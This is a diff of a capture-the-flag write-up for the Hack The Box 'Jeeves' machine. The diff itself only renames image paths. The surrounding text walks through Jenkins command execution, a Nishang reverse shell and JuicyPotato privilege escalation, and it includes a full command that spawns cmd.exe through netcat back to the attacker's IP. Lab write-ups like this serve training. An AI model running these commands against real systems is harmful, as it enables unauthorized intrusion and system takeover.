@@ -75,7 +75,7 @@ gobuster dir -u http://10.129.174.184:50000 -w /usr/share/wordlists/dirbuster/di
 
 Looking at the http site we are presented with a search bar
 
-![](<../../../.gitbook/assets/image (15) (1) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1) (1) (1).png>)
 
 Searching takes you to error.html which turns out to just be an image
 
@@ -107,11 +107,11 @@ Source code for site, the action results in error.html
 
 Quickly checking gobuster for jetty shows that we have a directory to check out
 
-![/askjeeves](<../../../.gitbook/assets/image (16) (1).png>)
+![/askjeeves](<../../../.gitbook/assets/image (16) (1) (1).png>)
 
 Going there we see Jenkins!
 
-![Jenkins](<../../../.gitbook/assets/image (24) (1).png>)
+![Jenkins](<../../../.gitbook/assets/image (24) (1) (1).png>)
 
 Turns out we have command execution without needing to be logged in which works in our favor
 
@@ -125,9 +125,9 @@ Using Nishang Invoke-PowerShellTcp.ps1 script we can create a reverse shell and 
 
 First we want to copy the example to the bottom of the script so that it is run when copied to the machine we are attacking
 
-![](<../../../.gitbook/assets/image (10).png>)
+![](<../../../.gitbook/assets/image (10) (1).png>)
 
-![](<../../../.gitbook/assets/image (6) (1).png>)
+![](<../../../.gitbook/assets/image (6) (1) (1).png>)
 
 Next we want to get a web server running and a netcat listener to catch the reverse shell. In this se I am using [updog](https://github.com/sc0tfree/updog) for my simple web server.
 
@@ -151,7 +151,7 @@ Next we want to run PowerUp.ps1 however we want to use the dev branch as it has 
 
 {% embed url="https://github.com/PowerShellMafia/PowerSploit/tree/dev" %}
 
-![](<../../../.gitbook/assets/image (13).png>)
+![](<../../../.gitbook/assets/image (13) (1).png>)
 
 Then we want to run these commands in our reverse shell
 
@@ -168,7 +168,7 @@ Right away we see SeImpersonatePrivilege which means this box is vulnerable to J
 
 We first need to download JuicyPotato.exe to the box which I am hosting from my kali box
 
-![](<../../../.gitbook/assets/image (22).png>)
+![](<../../../.gitbook/assets/image (22) (1).png>)
 
 We need to copy kali's nc.exe to the windows box
 
@@ -192,7 +192,7 @@ This is the input I used:
 cmd /c jp.exe -l 9001 -p c:\windows\system32\cmd.exe -a "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.14.92 9001" -t *
 ```
 
-![Got a shell](<../../../.gitbook/assets/image (23).png>)
+![Got a shell](<../../../.gitbook/assets/image (23) (1).png>)
 
 We got nt authority\system!&#x20;
 
